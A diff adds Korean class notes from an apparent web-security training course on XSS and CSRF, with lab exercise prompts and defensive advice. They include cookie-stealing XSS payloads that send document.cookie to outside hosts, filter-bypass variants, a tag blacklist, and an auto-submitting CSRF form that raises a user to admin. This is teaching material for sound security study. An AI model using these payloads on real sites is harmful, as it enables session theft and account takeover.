@@ -1,0 +1,382 @@
+1. 태그와 태그 사이
+<div class="row"> 
+    <script>
+        alert('XSS');
+    </script> 
+</div>
+
+<script>alert('XSS');</script>
+
+2. 태그 안에
+<input type="hidden" id="pageIndex" name="pageIndex" value="" /><script>alert("XSS");</script>   <"" />
+
+<html> 
+<input value="" />
+</html>
+
+" /><script>alert("XSS");</script>   <"
+
+3. 스크립트 안에 있을 떄
+<script>
+...
+
+javascript 문법에 맡게
+따옴표 세미콜론으로 해당 코드를 탈출!!해서
+악성코드 실행
+
+
+...
+..
+..
+</script>
+
+
+
+
+
+<script type="text/javascript">
+...
+...
+
+
+function fnEdit(){
+    document.location.href = 'noticeedit.php?board_id=' + '';}alert('XSS');function abc() {var abc = '      ';
+}
+
+</script>
+
+입력값 : ';alert('XSS');//
+입력값 : ';}alert('XSS');function abc() {var abc = '
+
+입력값 : ';}location.href = "https://ttyiejaizxjyxhveknedqsacahdwydob4.oast.fun/?cookie=" + document.cookie;function abc() {var abc = '
+
+
+location.href = "https://ttyiejaizxjyxhveknedqsacahdwydob4.oast.fun/?cookie=" + document.cookie;
+
+이거 게시물좀 확인하고 답변줘~
+
+https://elms2.skinfosec.co.kr:8083/exam17/noticeview.php?pageIndex=1&board_id='%3b}location.href+%3d+"https%3a//useworld.ddns.net/%3fcookie%3d"+%2b+document.cookie%3bfunction+abc()+{var+abc+%3d+'&sorting=&sotingAd=DESC&startDt=&endDt=&searchType=all&keyword=
+
+Blind SQL Injection -> 에러베이스처럼 한 문자열
+로그인창
+로그인이 성공하는지
+실패하는지
+참거짓
+
+inf6.asdfkljsadkfl.sdlkfj.com
+
+Out of Band test
+OOB test
+
+1. Reflected -> hanabank.com/adlfkjkjafsklj
+
+hacker.com <-> cookie:sessionid=ad
+hanabank.com <-> 로그인 사용자의 쿠키
+
+document.cookie
+
+ 쿠키 탈취
+ 해당 사이트에서 요청 
+
+ 문자가 왔는데
+
+ [웹발신] 하나은행
+ 곡
+ 이번 달 카드이용ㄴ애러
+ 
+ bit.ly/ldsfkjwea
+ 
+
+2. Stored
+
+해커 -> 1. 수많은 링크를 여러명한테 잔뜩 보내서
+       하나 걸리면 그걸로 공격 성공
+        2. 한개의 게시글-> 수많은 사람들이 알아서 클릭해서 
+
+* XSS 문제 3번
+
+1. 공격 URL : Copy URL 해서 붙여넣기
+2. 정답
+
+DM으로 보내주세요.
+
+-> location.href = "주소";
+
+Hint 1 : 문제 2번과 동일
+       alert 대신 공격구문 넣으면 됩니다.
+Hint 2 : 절대경로, 상대경로 고려
+
+* Web
+https://test.com/board/notice/list.jsp
+/board/notice/
+./ -> (test.com)/board/notice/
+../ -> (test.com)/board/
+/  -> (test.com)/
+<a href="test/view.php"> -> test.com/board/notice/test/view.php
+<a href="/test/view.php"> -> test.com/test/view.php
+
+
+pwd
+
+* Linux
+/usr/rk19/
+
+./ -> 현재 경로   /usr/rk19/
+../ -> 하나 상위  /usr/
+/   -> 최상위 경로  /
+
+* Web
+https://test.com/board/notice/list.jsp
+
+/board/notice/
+
+./ -> (test.com)/board/notice/
+../ -> (test.com)/board/
+/  -> (test.com)/
+
+<a href="test/view.php"> -> test.com/board/notice/test/view.php
+<a href="/test/view.php"> -> test.com/test/view.php
+
+
+function fnEdit(){
+    document.location.href = 'noticeedit.php?board_id=' + ''; 
+}
+location.href= 'exam18/location.php'; 
+function abc() {
+    var abc = '';
+}
+
+
+'; }location.href= 'https://lms.com/exam18/location.php'; function abc() {var abc = '
+
+https://lms.com/exam18/location.php
+
+PoC 
+
+
+BeEF
+
+2. Stored XSS
+스크립트를 삽입
+
+스크립트를 실행
+
+
+글 목록 : xsstest3 -> 태그와 태그 사이 -> <script>alert('XSS');</script>
+          xsstest6 ->  <script>alert('XSS');</script>
+          <>()'/;
+
+    xsstest3 
+
+    제발 읽어주세요.<script>alert('XSS');</script>
+
+
+* XSS 문제 6번 -> 7번
+
+1. 공격구문 삽입 URL : 글쓰기
+2. 파라미터명과 공격구문 : 
+3. 공격이 실행되는 URL : 글조회
+4. 정답 : 
+
+DM 보내주세요.
+
+
+* XSS 대응 방안
+1. 공격에 사용할 수 있는 특수문자를 HTML Entity Encoding
+ <> () / ; " ' -> &lt; &gt; 
+ 1) 클라이언트(X)        vs          서버
+    ~~~~~~~~~~
+    크롬 -> javascript          <script> -> &lt;script&gt;
+    &lt -> <
+
+ 2) 저장을 할 때 vs  조회를 할 때 치환
+ Request write -> 서버 (제목, 내용) -> DB
+
+  -> 출력할 때 신경을 안써됩니다.
+  -> 웹브라우저가 아닐경우
+
+제목 : <특종> 아이유 결혼
+내용 : 기사
+
+제목 : &lt;특종&gt;아이유 결혼  
+
+저장할 때
+ ====================================
+  id       title         content
+=====================================
+  1        읽어줘        테스트
+  2        &lt;특종&gt;아이유 결혼   기사
+
+  또 html
+  &amp;lt;특종&amp;gt;아이ㅠ
+
+조회할 때
+====================================
+  id       title         content
+=====================================
+  1        읽어줘        테스트
+  2         test       test<script>alert('xss');</script>
+  3      <특종> 아이유 결혼  기사
+
+출력을 할때 모든 출력하는 기능에서 다 치환을 잘해줘야 합니다.
+
+1. 전체
+2. White List
+<script> (X) -> &lt;script
+<img src="사진파일"/> &lt;img src=  &gt;
+<h2> </h2>   &lt;h2&gt;
+
+===================
+img -> XSS 공격이 가능한 이벤트 핸들러는 싸그리다 못쓰게 막어야 함.
+a
+h2
+==================
+내용.replaceAll('&lt;img','<img)
+내용.replaceAlll('&lt;h2&gt;','<h2>')
+
+3. Blacklist
+
+=============
+script
+embed
+iframe
+=============
+-> 내용.replaceAll("<script>","<x-script>")
+
+2. 사용자 입력값의 검증 -> Filtering
+
+
+
+* 문제 8번 XSS -> 9번
+
+1. 어떻게 보안조치가 되어있음
+2. 공격에 사용한 구문
+3. 정답
+
+DM 보내주세요.
+
+9번
+- Hint : SQL Injection 필터링 우회할 때 했던 내용입니다.
+
+
+           
+testxss<script>alert('xss');</script>
+
+<script> <- ''
+testxssalert('xss');
+
+testxss<script>alert('xss');</script>
+testxss<scrscriptipt>alealertrt('XSS');</scrscriptipt>
+<img src=x onerronerroror=alealertrt('XSS') />
+
+
+* XSS(Cross-site Scripting)
+1. Relected XSS
+  -> 링크 전달 방식으로 공격
+    수많은 노력을 해서 하나 건질까말까
+    
+2. Stored XSS
+  -> 게시판 등 저장해서 공격
+    한개만 올려놔도 수많은 애들이 누를수도 있다
+
+대응방안
+공격에 사용하는 특수문자 싸그리 다 html entity Encoding
+Whitelist 풀어주고
+BlackList 막아주고
+
+js (X) -> 백엔드
+저장할때 치환? 출력할때 치환? <-
+
+사용자 입력값 검증 -> Filtering
+
+
+
+* CSRF=XSRF(Cross-site Request Forgery)
+
+ID,PW or Cookie SessionID // 해당 서버에 작업을 자기도 모르게 시키는 거 <- CSRF
+
+CyWorld
+
+- 미니홈피 - 1촌 파도타기
+
+Today 10 Total 1000
+
+방문자 추적기 
+
+
+사진첩
+게시판
+방명록
+
+
+- 방문자리스트 <- 비밀게시판 쓸수
+
+요청 cyworld.com/useworld/board/visitlist/write?content=나왔다감~
+
+<iframe 
+
+1. 프사 <img src="cyworld.com/useworld/board/visitlist/write?content=나왔다감~">
+2. 글제목에 Tag <- 태그 X
+3. XSS <- XSS 막기
+   <script>
+   window.location.href = "cyworld.com/useworld/board/visitlist/write?content=나왔다감~"
+   </script>
+4. 미니룸 미니미 대사
+5. Flash 코드에다가 빤짝 + 게시판에 글쓰기 요청
+
+정상적인  경로로
+글쓰기 한건지 
+
+비밀번호 변경 페이지
+test.com/member/changePW?newpassword=1234
+Cookie:SessionID=
+
+<script>
+비밀번호 1234로 바꾸는 요청보내기 코드;
+</script>
+
+hacker.com 
+
+* 대응방안
+1. 추가인증 (O) -> 겁나 번거롭다
+- 2차인증(SMS, OTP), ...
+2. CSRF Token (세모) -> 토큰 안털리게 잘 해놔야댐
+- 토큰 <-
+
+Referer Check (세모) -> 안하는거보단 나음
+GET -> POST -> 안하는거보단 나음
+
+
+POST /bbs11/updateGetAuth HTTP/1.1
+host:https://elms1.skinfosec.co.kr:8082
+
+loginId=pppp@pppp.com&adminYn=2
+
+GETG https://elms1.skinfosec.co.kr:8082?loginId=pppp@pppp.com&adminYn=2
+https://elms1.skinfosec.co.kr:8082/bbs11/updateGetAuth?loginId=pppp@pppp.com&adminYn=2
+
+
+POST /bbs11/updateGetAuth HTTP/1.1
+host:https://elms1.skinfosec.co.kr:8082
+
+loginId=pppp@pppp.com&adminYn=2
+
+* CSRF 문제 2번
+
+1. 공격 구문 : 글내용 복사->붙여넣기
+2. 정답 :
+
+DM 보내주세요.
+
+이전 게시물, 이전 URL로 하시면 안됩니다~
+updateGetAuth 아니고 updatePostAuth 입니다!
+
+<form id='attackForm' action="주소" method="post">
+        <input name="loginId" value="이메일"/>
+        <input name="adminYn" value="2"/>
+</form> 
+
+<script>
+    document.getElementById('attackForm').submit();
+</script>
+
